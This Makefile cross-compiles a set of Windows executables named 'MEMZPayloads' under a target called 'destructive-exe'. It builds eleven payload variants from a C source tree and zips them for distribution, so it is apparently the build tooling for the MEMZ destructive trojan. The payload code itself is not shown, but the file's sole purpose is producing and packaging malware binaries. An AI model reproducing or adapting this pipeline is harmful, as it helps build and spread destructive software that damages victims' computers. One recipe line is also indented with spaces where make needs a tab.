CC = i686-w64-mingw32-gcc
PYTHON = python2

CCFLAGS = -nostdlib -nodefaultlibs -std=c99 -Wl,-e_start -s -mwindows -m32 -municode -Os -w -march=i486
LIBS    = -luser32 -lkernel32 -lgdi32 -lwinmm -lcomctl32 -ladvapi32 -lshell32 -lpsapi

CFILES = $(shell find Source -name '*.c' -type f)
HFILES = $(shell find Source -name '*.h' -type f)

DATA = $(wildcard Data/*)

FNAMES := 0 1 2 3 4 5 6 7 8 9 10

all: dir destructive-exe

dir: $(BUILDDIR) $(BUILDDIR)/Bin

$(BUILDDIR):
	mkdir -p $(BUILDDIR)

$(BUILDDIR)/Bin:
	mkdir -p $(BUILDDIR)/Bin
	
$(BUILDDIR)/Data.c $(BUILDDIR)/Data.h: $(DATA)
	$(PYTHON) Data/genData.py $(BUILDDIR)/Data.c $(BUILDDIR)/Data.h

destructive-exe: dir $(CFILES) $(HFILES) $(BUILDDIR)/Data.c $(BUILDDIR)/Data.h
        for name in `echo $(FNAMES)`; \
	do \
		$(CC) $(CCFLAGS) $(CFILES) $(BUILDDIR)/Data.c $(LIBS) -o Build/Bin/MEMZPayloads-$$name.exe -DPL2=$$name; \
	done
	zip -r ./Build/Bin/payloads.zip ./Build/Bin/
	
clean:
	rm -r $(BUILDDIR)

.PHONY: clean all dir destructive-exe
